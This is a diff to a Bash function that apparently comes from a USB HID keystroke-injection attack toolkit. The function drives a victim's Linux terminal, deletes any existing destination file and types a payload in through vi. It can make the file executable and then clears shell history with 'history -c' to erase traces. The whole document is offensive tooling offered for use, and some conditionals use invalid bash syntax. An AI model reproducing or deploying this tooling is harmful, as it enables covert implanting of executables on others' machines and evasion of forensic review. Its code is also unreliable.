@@ -2,44 +2,55 @@
 #
 # DROP v1 by bg-wa
 # Simplifies dropping files from HID attacks for LINUX
-# Usage: DROP bb_source_file.txt attack_destination_file.txt [overwrite]
+# Usage: DROP bb_source_file.txt attack_destination_file.txt [overwrite: false] [executable: false]
 #
 # Example:
-# DROP /root/udisk/payloads/$SWITCH_POSITION/source.txt ~/target_destination.txt true
+# DROP /root/udisk/payloads/$SWITCH_POSITION/source.sh ~/target_destination.sh true true
 source ./run.sh
-source ./debug.sh
 
 function DROP() {
-    DEBUG "drop" "start"
-    local source=$2
-    local destination=$3
-    local overwrite=$4
-   #local os=
+    source=$1
+    destination=$2
+    overwrite=$3
+    executable=$4
+    #os=
 
-    RUN terminal
+    RUN UNITY xterm
     QUACK DELAY 1000
+
+    if "$overwrite" == "true"
+    then
+        QUACK STRING rm "$destination"
+        QUACK ENTER
+        QUACK DELAY 500
+    fi
     QUACK STRING vi "$destination"
     QUACK ENTER
     QUACK DELAY 500
     QUACK STRING i
-    ;;
-   
-   while IFS= read data
+
+    while IFS= read -r data
     do
-        if [ "${data}" = " " ]
-        then
-           QUACK SPACE
-        else
-           QUACK STRING "$data"
-        fi
+        QUACK STRING "$data"
+        QUACK ENTER
     done < "$source"
 
+    QUACK DELAY 500
     QUACK ESC
-    if $overwrite
-        QUACK STRING :wq!
-    else
-        QUACK STRING :wq
+    QUACK ENTER
+    QUACK STRING :wq
+    QUACK ENTER
+
+    if "$executable" == "true"
+    then
+        QUACK STRING chmod +x "$destination"
+        QUACK ENTER
+        QUACK DELAY 500
     fi
+
+    QUACK STRING history -c
+    QUACK ENTER
+    QUACK STRING exit
     QUACK ENTER
 }
 
